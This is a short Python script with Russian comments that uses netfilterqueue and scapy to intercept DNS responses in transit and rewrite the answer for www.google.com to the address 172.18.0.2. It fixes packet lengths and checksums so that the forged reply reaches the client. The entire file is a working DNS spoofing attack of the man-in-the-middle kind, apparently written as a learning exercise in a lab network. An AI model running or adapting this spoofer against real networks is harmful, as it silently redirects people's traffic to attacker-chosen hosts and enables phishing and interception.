import netfilterqueue
import scapy.all as scapy

# фун перебора
def  proccess_packet(packet):
    # через скапи с помщью нэта мы можем получить теже строки но потом будем изменять
    scapy_pack = scapy.IP(packet.get_payload())
    # выводим dns ip 
    if scapy_pack.haslayer(scapy.DNSRR):#для получения запроса, либо для DNSRQ - ответа
        # переменная имени запроса dns qname
        qname = scapy_pack[scapy.DNSQR].qname
        name_ip = b"www.google.com"
        # создаем фун длля проверки на совпадение имени dns
        if name_ip in qname:
            print("[+] New ip-address")
            #пишем запрос на смену полей укз только нужные далее авт подставит
            answer = scapy.DNSRR(rrname=qname, rdata="172.18.0.2")# укз нужный ip
            print(answer)
            # укз наш ответ на запрос к dns
            scapy_pack[scapy.DNS].an = answer
            # меняем кол-во пакетов отправл с запроса на наше
            scapy_pack[scapy.DNS].ancount = 1
            
            # удаляем строки отвеч за разрмер пакета, длину 
            del scapy_pack[scapy.IP].len
            del scapy_pack[scapy.IP].chksum
            del scapy_pack[scapy.UDP].chksum
            del scapy_pack[scapy.UDP].len
            
            # переводим в строку чтобы файлы стали читаемы для ответа
            packet.set_payload(bytes(scapy_pack))#теперь все вернется клиенту правильно
            
        # print(scapy_pack.show())    
            
    # для разрешения передачи
    packet.accept()
    
    # для запрета
    # packet.drop()

#переменная для пакетов 
queue = netfilterqueue.NetfilterQueue()
# перебор пакетов в 0 где обозначали хранение
queue.bind(0, proccess_packet)
queue.run()